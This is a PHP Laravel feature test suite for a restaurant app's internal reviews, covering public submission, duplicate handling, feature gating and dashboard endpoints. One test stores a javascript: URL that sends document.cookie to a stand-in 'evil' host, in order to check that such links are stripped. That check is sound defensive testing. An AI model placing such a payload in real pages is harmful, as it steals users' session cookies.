<?php

namespace Tests\Feature;

use App\Enums\RestaurantStatus;
use App\Enums\ReviewStatus;
use App\Models\Branch;
use App\Models\DiningArea;
use App\Models\DiningTable;
use App\Models\InternalReview;
use App\Models\MenuSession;
use App\Models\Restaurant;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Tests\TestCase;

class InternalReviewTest extends TestCase
{
    use RefreshDatabase;

    private Restaurant $restaurant;

    private User $admin;

    private Branch $branch;

    private DiningArea $area;

    private DiningTable $table;

    protected function setUp(): void
    {
        parent::setUp();
        $this->restaurant = Restaurant::factory()->create(['status' => RestaurantStatus::ACTIVE, 'slug' => 'reviewery']);
        $this->admin = User::factory()->restaurantAdmin($this->restaurant->id)->create();
        $this->enableReviews();

        $this->branch = new Branch(['name_en' => 'Main']);
        $this->branch->restaurant_id = $this->restaurant->id;
        $this->branch->save();

        $this->area = new DiningArea(['branch_id' => $this->branch->id, 'name_en' => 'Indoor']);
        $this->area->restaurant_id = $this->restaurant->id;
        $this->area->save();

        $this->table = $this->makeTable('7');
    }

    private function enableReviews(): void
    {
        $this->restaurant->features()->create(['feature_key' => 'internal_reviews', 'is_enabled' => true]);
        $this->restaurant->load('features');
    }

    private function makeTable(string $label): DiningTable
    {
        $t = new DiningTable([
            'dining_area_id' => $this->area->id, 'label' => $label,
            'public_token' => DiningTable::generateToken(), 'is_active' => true,
            'qr_generated_at' => now(),
        ]);
        $t->restaurant_id = $this->restaurant->id;
        $t->branch_id = $this->branch->id;
        $t->save();

        return $t;
    }

    private function makeSession(): MenuSession
    {
        $s = new MenuSession([
            'branch_id' => $this->branch->id,
            'dining_area_id' => $this->area->id,
            'table_id' => $this->table->id,
            'language' => 'en',
            'session_token' => Str::random(40),
            'started_at' => now(),
            'last_activity_at' => now(),
            'expires_at' => now()->addHours(2),
        ]);
        $s->restaurant_id = $this->restaurant->id;
        $s->save();

        return $s;
    }

    private function makeReview(int $rating, ?string $status = null): InternalReview
    {
        $review = new InternalReview([
            'branch_id' => $this->branch->id,
            'dining_area_id' => $this->area->id,
            'table_id' => $this->table->id,
            'rating' => $rating,
            'status' => $status ?? ReviewStatus::NEW->value,
        ]);
        $review->restaurant_id = $this->restaurant->id;
        $review->save();

        return $review;
    }

    /**
     * review_public_url is tenant-controlled and lands in an <a href> on the
     * public menu, so a javascript: value must never reach the client.
     */
    public function test_a_dangerous_review_url_is_never_returned_to_the_public(): void
    {
        $this->restaurant->forceFill([
            'review_public_url' => 'javascript:fetch("//evil?c="+document.cookie)',
        ])->save();

        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
            'rating' => 5,
            'comment' => 'Great!',
        ])
            ->assertCreated()
            ->assertJsonPath('data.public_review_url', null);

        $this->getJson("/api/public/restaurants/{$this->restaurant->slug}/menu")
            ->assertOk()
            ->assertJsonPath('data.restaurant.review_public_url', null);
    }

    /** A legitimate review link still reaches the diner untouched. */
    public function test_a_normal_review_url_is_passed_through(): void
    {
        $this->restaurant->forceFill(['review_public_url' => 'https://g.page/r/abc/review'])->save();

        $this->getJson("/api/public/restaurants/{$this->restaurant->slug}/menu")
            ->assertOk()
            ->assertJsonPath('data.restaurant.review_public_url', 'https://g.page/r/abc/review');
    }

    // AC-008 — a review left from a table session links to its table/branch/area.
    public function test_public_create_links_to_table_when_session_given(): void
    {
        $session = $this->makeSession();

        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
            'rating' => 5,
            'comment' => 'Great!',
            'session_token' => $session->session_token,
        ])
            ->assertCreated()
            ->assertJsonStructure(['data' => ['thank_you', 'public_review_url'], 'message']);

        $this->assertDatabaseHas('internal_reviews', [
            'restaurant_id' => $this->restaurant->id,
            'menu_session_id' => $session->id,
            'table_id' => $this->table->id,
            'branch_id' => $this->branch->id,
            'dining_area_id' => $this->area->id,
            'rating' => 5,
            'status' => ReviewStatus::NEW->value,
        ]);
    }

    // FR-REVIEW-017 — one review per session; a second is a no-op duplicate.
    public function test_second_review_for_same_session_returns_duplicate(): void
    {
        $session = $this->makeSession();

        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
            'rating' => 4, 'session_token' => $session->session_token,
        ])->assertCreated();

        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
            'rating' => 2, 'session_token' => $session->session_token,
        ])->assertOk()->assertJsonPath('duplicate', true);

        $this->assertSame(1, InternalReview::withoutGlobalScopes()->where('menu_session_id', $session->id)->count());
    }

    public function test_public_create_forbidden_without_feature(): void
    {
        $this->restaurant->features()->where('feature_key', 'internal_reviews')->update(['is_enabled' => false]);

        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
            'rating' => 5,
        ])->assertStatus(403);
    }

    public function test_public_create_rating_out_of_range_is_rejected(): void
    {
        $this->postJson("/api/public/restaurants/{$this->restaurant->slug}/reviews", [
            'rating' => 6,
        ])->assertStatus(422);
    }

    public function test_dashboard_lists_and_filters_reviews(): void
    {
        $this->makeReview(5);
        $this->makeReview(2);
        $this->makeReview(2, ReviewStatus::RESOLVED->value);

        $this->actingAs($this->admin)->getJson('/api/dashboard/reviews')
            ->assertOk()->assertJsonCount(3, 'data');

        $this->actingAs($this->admin)->getJson('/api/dashboard/reviews?rating=2')
            ->assertOk()->assertJsonCount(2, 'data');

        $this->actingAs($this->admin)->getJson('/api/dashboard/reviews?status='.ReviewStatus::RESOLVED->value)
            ->assertOk()->assertJsonCount(1, 'data');
    }

    public function test_dashboard_summary_returns_average_and_low_count(): void
    {
        $this->makeReview(5);
        $this->makeReview(1);
        $this->makeReview(2);

        $this->actingAs($this->admin)->getJson('/api/dashboard/reviews/summary')
            ->assertOk()
            ->assertJsonPath('count', 3)
            ->assertJsonPath('average', 2.7)
            ->assertJsonPath('low_count', 2)
            ->assertJsonPath('by_rating.5', 1)
            ->assertJsonPath('by_rating.1', 1);
    }

    // FR-REVIEW-015 — a low rating is flagged for attention.
    public function test_low_rating_is_flagged(): void
    {
        $low = $this->makeReview(2);
        $high = $this->makeReview(5);

        $res = $this->actingAs($this->admin)->getJson('/api/dashboard/reviews')->assertOk();

        $byId = collect($res->json('data'))->keyBy('id');
        $this->assertTrue($byId[$low->id]['is_low']);
        $this->assertFalse($byId[$high->id]['is_low']);
    }

    public function test_dashboard_updates_status(): void
    {
        $review = $this->makeReview(3);

        $this->actingAs($this->admin)->patchJson("/api/dashboard/reviews/{$review->id}/status", [
            'status' => ReviewStatus::CONTACTED->value,
        ])->assertOk()->assertJsonPath('data.status', ReviewStatus::CONTACTED->value);

        $this->assertSame(ReviewStatus::CONTACTED->value, $review->fresh()->status->value);
    }

    public function test_dashboard_adds_note_with_author(): void
    {
        $review = $this->makeReview(2);

        $this->actingAs($this->admin)->postJson("/api/dashboard/reviews/{$review->id}/notes", [
            'note' => 'Called the guest, resolved.',
        ])->assertOk()
            ->assertJsonPath('data.notes.0.note', 'Called the guest, resolved.')
            ->assertJsonPath('data.notes.0.user_name', $this->admin->name);

        $this->assertDatabaseHas('review_internal_notes', [
            'internal_review_id' => $review->id,
            'user_id' => $this->admin->id,
        ]);
    }

    public function test_dashboard_endpoints_forbidden_without_feature(): void
    {
        $this->restaurant->features()->where('feature_key', 'internal_reviews')->update(['is_enabled' => false]);
        $review = $this->makeReview(3);

        $this->actingAs($this->admin)->getJson('/api/dashboard/reviews')->assertStatus(403);
        $this->actingAs($this->admin)->getJson('/api/dashboard/reviews/summary')->assertStatus(403);
        $this->actingAs($this->admin)->patchJson("/api/dashboard/reviews/{$review->id}/status", [
            'status' => ReviewStatus::RESOLVED->value,
        ])->assertStatus(403);
    }
}
